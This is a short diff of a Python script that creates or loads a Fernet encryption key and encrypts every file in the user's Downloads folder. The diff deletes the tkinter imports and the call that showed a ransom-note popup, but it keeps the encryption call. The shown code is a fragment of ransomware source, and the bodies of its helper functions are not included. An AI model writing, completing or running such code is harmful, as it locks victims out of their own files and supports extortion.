@@ -1,8 +1,6 @@
 import os
 from pathlib import Path
 from cryptography.fernet import Fernet
-import tkinter as tk
-from tkinter import messagebox
 
 # Function to generate and save a secure encryption key
 def generate_and_save_key(key_path='encryption_key.key'):
@@ -44,6 +42,3 @@ key = generate_and_save_key(key_path) if not Path(key_path).exists() else load_k
 
 # Encrypt files in the Downloads folder
 encrypt_downloads_folder(key)
-
-# Show the ransom note popup
-show_ransom_note_popup()
